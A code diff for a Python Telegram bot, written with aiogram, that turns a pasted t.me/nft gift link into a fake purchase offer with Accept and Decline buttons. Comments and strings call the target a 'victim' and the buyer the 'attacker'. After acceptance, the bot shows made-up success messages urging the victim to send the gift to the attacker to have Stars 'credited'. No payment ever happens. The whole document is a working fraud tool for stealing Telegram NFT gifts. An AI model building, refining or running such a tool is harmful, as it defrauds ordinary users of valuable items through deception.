@@ -1,8 +1,7 @@
 import asyncio
 import logging
 import json
-import os
-from urllib.parse import quote
+import re
 from pathlib import Path
 
 from aiogram import Bot, Dispatcher, F
@@ -12,7 +11,7 @@ from aiogram.types import (
     CallbackQuery,
     InlineKeyboardMarkup,
     InlineKeyboardButton,
-    WebAppInfo,
+    InputMediaPhoto,
 )
 from aiogram.enums import ParseMode
 
@@ -24,19 +23,12 @@ dp = Dispatcher()
 
 TEMPLATES_FILE = Path("templates.json")
 
-# Default templates
 DEFAULT_TEMPLATES = {
     "icecream": {
         "gift_name": "Ice Cream #201001",
         "stars": 7000,
         "image": "https://cdn.changes.tg/gifts/models/Ice%20Cream/png/Original.png",
         "expiry": "5h 59m"
-    },
-    "heart": {
-        "gift_name": "Heart",
-        "stars": 5000,
-        "image": "https://cdn.changes.tg/gifts/models/Heart/png/Original.png",
-        "expiry": "12h"
     }
 }
 
@@ -55,35 +47,48 @@ def save_templates(templates: dict):
 
 
 templates = load_templates()
-current_default = "icecream"
+current_default = list(templates.keys())[0] if templates else "icecream"
+current_buyer = config.ATTACKER_USERNAME
 
 
 def is_admin(user_id: int) -> bool:
     return user_id in config.ADMIN_IDS
 
 
-def build_webapp_url(gift_name: str, stars: int, buyer: str, image: str = "") -> str:
-    params = (
-        f"?gift={quote(gift_name)}"
-        f"&stars={stars}"
-        f"&buyer={quote(buyer)}"
-    )
-    if image:
-        params += f"&img={quote(image)}"
-    return config.WEBAPP_URL.rstrip("/") + params
+def parse_gift_link(text: str) -> dict | None:
+    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
+    if m:
+        name_raw = m.group(1)
+        num = m.group(2)
+        gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_raw)
+        slug = f"{name_raw.lower()}-{num}"
+        image = f"https://nft.fragment.com/gift/{slug}.medium.jpg"
+        return {
+            "gift_name": f"{gift_name} #{num}",
+            "slug": slug,
+            "image": image,
+            "num": num
+        }
+    return None
 
 
-def build_offer_keyboard(gift_name: str, stars: int, image: str = "") -> InlineKeyboardMarkup:
-    url = build_webapp_url(gift_name, stars, config.ATTACKER_USERNAME, image)
+def offer_keyboard(gift_name: str, stars: int) -> InlineKeyboardMarkup:
+    # Regular buttons, no WebApp
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✓ Accept", web_app=WebAppInfo(url=url)),
-            InlineKeyboardButton(text="✗ Decline", callback_data="decline_offer")
+            InlineKeyboardButton(
+                text="✗ Decline",
+                callback_data=f"decline:{gift_name[:40]}"
+            ),
+            InlineKeyboardButton(
+                text="✓ Accept",
+                callback_data=f"accept:{gift_name[:40]}:{stars}"
+            )
         ]
     ])
 
 
-def build_offer_text(gift_name: str, stars: int, buyer: str, expiry: str) -> str:
+def build_offer_caption(gift_name: str, stars: int, buyer: str, expiry: str) -> str:
     return (
         f"<b>User {buyer} is offering you\n"
         f"{stars} Stars for the gift {gift_name}.</b>\n\n"
@@ -99,14 +104,16 @@ async def cmd_start(message: Message):
 
     text = (
         "<b>Gift Offer Bot</b>\n\n"
+        "Кинь ссылку + цену (опционально):\n"
+        "<code>https://t.me/nft/IceCream-201001 15000</code>
+или просто ссылку (тогда 7000 Stars)\n\n"
+        "Бот пришлёт готовое сообщение с кнопками Accept/Decline.\n"
+        "Перешли его жертве.\n\n"
         "Команды:\n"
-        "/offer @user [шаблон]\n"
-        "/templates — список шаблонов\n"
-        "/newtemplate имя подарок звезды [картинка] [время]\n"
-        "/setdefault имя — сделать шаблон по умолчанию\n"
-        "/deltemplate имя\n\n"
-        f"Текущий default: <code>{current_default}</code>\n"
-        f"Attacker: <code>@{config.ATTACKER_USERNAME}</code>"
+        "/templates\n"
+        "/newtemplate имя подарок звезды\n"
+        "/setdefault имя\n\n"
+        f"Attacker: <code>@{current_buyer}</code>"
     )
     await message.answer(text, parse_mode=ParseMode.HTML)
 
@@ -121,11 +128,7 @@ async def cmd_templates(message: Message):
     lines = ["<b>Шаблоны:</b>\n"]
     for name, t in templates.items():
         mark = " ← default" if name == current_default else ""
-        lines.append(
-            f"• <code>{name}</code>{mark}\n"
-            f"  {t['gift_name']} — {t['stars']} Stars\n"
-            f"  expires: {t.get('expiry', '5h 59m')}"
-        )
+        lines.append(f"• <code>{name}</code>{mark}\n  {t['gift_name']} — {t['stars']} Stars")
     await message.answer("\n".join(lines), parse_mode=ParseMode.HTML)
 
 
@@ -135,54 +138,32 @@ async def cmd_newtemplate(message: Message, command: CommandObject):
         return
     if not command.args:
         await message.answer(
-            "Формат:\n"
-            "<code>/newtemplate имя подарок звезды [картинка] [время]</code>\n\n"
-            "Пример:\n"
-            "<code>/newtemplate rare \"Rare Gift #123\" 15000</code>\n"
-            "<code>/newtemplate icecream2 Ice Cream 9000 https://... 3h</code>",
+            "Формат:\n<code>/newtemplate имя подарок звезды</code>",
             parse_mode=ParseMode.HTML
         )
         return
 
     parts = command.args.split()
     if len(parts) < 3:
-        await message.answer("Минимум: имя, название подарка, звёзды")
+        await message.answer("Минимум: имя, название, звёзды")
         return
 
     name = parts[0].lower()
     try:
-        stars = int(parts[-1]) if parts[-1].isdigit() else int(parts[2])
-        # smarter parse
-        if parts[-1].isdigit() and len(parts) >= 3:
-            stars = int(parts[-1])
-            gift_parts = parts[1:-1]
-            image = ""
-            expiry = "5h 59m"
-            # if last of gift_parts looks like url
-            if gift_parts and gift_parts[-1].startswith("http"):
-                image = gift_parts[-1]
-                gift_parts = gift_parts[:-1]
-            gift_name = " ".join(gift_parts)
-        else:
-            stars = int(parts[2])
-            gift_name = parts[1]
-            image = parts[3] if len(parts) > 3 and parts[3].startswith("http") else ""
-            expiry = parts[4] if len(parts) > 4 else "5h 59m"
-    except Exception:
-        await message.answer("Не смог разобрать. Пример:\n<code>/newtemplate mygift Ice Cream #1 7000</code>", parse_mode=ParseMode.HTML)
+        stars = int(parts[-1])
+        gift_name = " ".join(parts[1:-1])
+    except ValueError:
+        await message.answer("Последнее число — количество звёзд")
         return
-
-    if not gift_name:
-        gift_name = "Gift"
 
     templates[name] = {
         "gift_name": gift_name,
         "stars": stars,
-        "image": image or config.DEFAULT_GIFT_IMAGE,
-        "expiry": expiry if 'expiry' in locals() else "5h 59m"
+        "image": config.DEFAULT_GIFT_IMAGE,
+        "expiry": "5h 59m"
     }
     save_templates(templates)
-    await message.answer(f"Шаблон <code>{name}</code> сохранён.\n{gift_name} — {stars} Stars", parse_mode=ParseMode.HTML)
+    await message.answer(f"Шаблон <code>{name}</code> сохранён.", parse_mode=ParseMode.HTML)
 
 
 @dp.message(Command("setdefault"))
@@ -191,102 +172,119 @@ async def cmd_setdefault(message: Message, command: CommandObject):
     if not is_admin(message.from_user.id):
         return
     if not command.args:
-        await message.answer("Укажи имя: /setdefault icecream")
-        return
-    name = command.args.strip().lower()
-    if name not in templates:
-        await message.answer(f"Шаблон <code>{name}</code> не найден.", parse_mode=ParseMode.HTML)
-        return
-    current_default = name
-    await message.answer(f"Default шаблон: <code>{name}</code>", parse_mode=ParseMode.HTML)
-
-
-@dp.message(Command("deltemplate"))
-async def cmd_deltemplate(message: Message, command: CommandObject):
-    if not is_admin(message.from_user.id):
-        return
-    if not command.args:
-        await message.answer("Укажи имя: /deltemplate name")
         return
     name = command.args.strip().lower()
     if name in templates:
-        del templates[name]
-        save_templates(templates)
-        await message.answer(f"Удалён: <code>{name}</code>", parse_mode=ParseMode.HTML)
-    else:
-        await message.answer("Не найден.")
+        current_default = name
+        await message.answer(f"Default: <code>{name}</code>", parse_mode=ParseMode.HTML)
 
 
-@dp.message(Command("offer"))
-async def cmd_offer(message: Message, command: CommandObject):
+
+@dp.message(Command("setbuyer"))
+async def cmd_setbuyer(message: Message, command: CommandObject):
+    global current_buyer
     if not is_admin(message.from_user.id):
-        await message.answer("Access denied.")
         return
-
     if not command.args:
-        await message.answer(
-            "Формат:\n"
-            "<code>/offer @username [шаблон]</code>\n\n"
-            "Примеры:\n"
-            "<code>/offer @victim</code>\n"
-            "<code>/offer @victim icecream</code>\n"
-            "<code>/offer @victim heart</code>",
-            parse_mode=ParseMode.HTML
-        )
+        await message.answer(f"Текущий buyer: <code>@{current_buyer}</code>\n\nФормат: <code>/setbuyer username</code>", parse_mode=ParseMode.HTML)
+        return
+    current_buyer = command.args.strip().lstrip("@")
+    await message.answer(f"Buyer изменён на <code>@{current_buyer}</code>", parse_mode=ParseMode.HTML)
+
+
+@dp.message(F.text)
+async def on_text(message: Message):
+    if not is_admin(message.from_user.id):
         return
 
-    parts = command.args.split()
-    target = parts[0].lstrip("@")
-    template_name = parts[1].lower() if len(parts) > 1 else current_default
-
-    if template_name not in templates:
-        # try to parse as custom inline: gift stars
-        await message.answer(f"Шаблон <code>{template_name}</code> не найден. Используй /templates", parse_mode=ParseMode.HTML)
+    text = message.text or ""
+    gift = parse_gift_link(text)
+    if not gift:
         return
 
-    t = templates[template_name]
-    gift_name = t["gift_name"]
-    stars = t["stars"]
-    image = t.get("image", "")
-    expiry = t.get("expiry", "5h 59m")
-
-    text = build_offer_text(gift_name, stars, config.ATTACKER_USERNAME, expiry)
-    kb = build_offer_keyboard(gift_name, stars, image)
+    stars_match = re.search(r"\b(\d{3,6})\b", text)
+    stars = int(stars_match.group(1)) if stars_match else config.DEFAULT_STARS
+    expiry = "5h 59m"
+    caption = build_offer_caption(gift["gift_name"], stars, current_buyer, expiry)
+    kb = offer_keyboard(gift["gift_name"], stars)
 
     await message.answer(
-        f"<b>Превью для @{target}</b>\n"
-        f"Шаблон: <code>{template_name}</code>\n"
-        f"Подарок: <code>{gift_name}</code>\n"
-        f"Stars: <code>{stars}</code>\n\n"
+        f"Готовый оффер на <b>{gift['gift_name']}</b> ({stars} Stars).\n"
         "Перешли сообщение ниже жертве.",
         parse_mode=ParseMode.HTML
     )
 
-    await message.answer(text, reply_markup=kb, parse_mode=ParseMode.HTML)
+    try:
+        await message.answer_photo(
+            photo=gift["image"],
+            caption=caption,
+            reply_markup=kb,
+            parse_mode=ParseMode.HTML
+        )
+    except Exception:
+        # fallback without photo
+        await message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
 
-    if image:
-        try:
-            await message.answer_photo(photo=image, caption=f"<b>{gift_name}</b>", parse_mode=ParseMode.HTML)
-        except Exception:
-            pass
 
-
-@dp.callback_query(F.data == "decline_offer")
+@dp.callback_query(F.data.startswith("decline:"))
 async def on_decline(callback: CallbackQuery):
-    await callback.message.edit_text("Offer declined.")
+    await callback.message.edit_caption(
+        caption="Offer declined.",
+        reply_markup=None
+    )
     await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("accept:"))
+async def on_accept(callback: CallbackQuery):
+    # data format: accept:Gift Name:stars
+    parts = callback.data.split(":", 2)
+    gift_name = parts[1] if len(parts) > 1 else "Gift"
+    stars = parts[2] if len(parts) > 2 else "7000"
+
+    # Edit original message
+    try:
+        await callback.message.edit_caption(
+            caption=(
+                f"<b>The offer to sell {gift_name} has been successfully accepted.</b>\n\n"
+                f"Transfer the gift to the buyer to have {stars} Stars credited to your balance."
+            ),
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Transfer", callback_data="transfer_done")]
+            ]),
+            parse_mode=ParseMode.HTML
+        )
+    except Exception:
+        pass
+
+    # Also send a follow-up
+    await callback.message.answer(
+        f"🎁 Gift <b>{gift_name}</b> has been successfully sold!\n\n"
+        f"• Transfer the gift to <b>@{current_buyer}</b> to receive your Stars.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Open profile", url=f"https://t.me/{current_buyer}")]
+        ])
+    )
+    await callback.answer("Accepted")
+
+
+@dp.callback_query(F.data == "transfer_done")
+async def on_transfer(callback: CallbackQuery):
+    await callback.answer("Send the gift to the buyer")
+    await callback.message.answer(
+        f"Send the gift to <b>@{current_buyer}</b> to receive Stars.",
+        parse_mode=ParseMode.HTML
+    )
 
 
 @dp.message(F.web_app_data)
 async def on_webapp_data(message: Message):
-    if not is_admin(message.from_user.id):
-        return
-    data = message.web_app_data.data
-    await message.answer(f"<b>WebApp event</b>\n<code>{data}</code>", parse_mode=ParseMode.HTML)
+    pass  # unused now
 
 
 async def main():
-    print("Bot started. Templates loaded:", list(templates.keys()))
+    print("Bot started (no WebApp mode).")
     await dp.start_polling(bot)
 
 
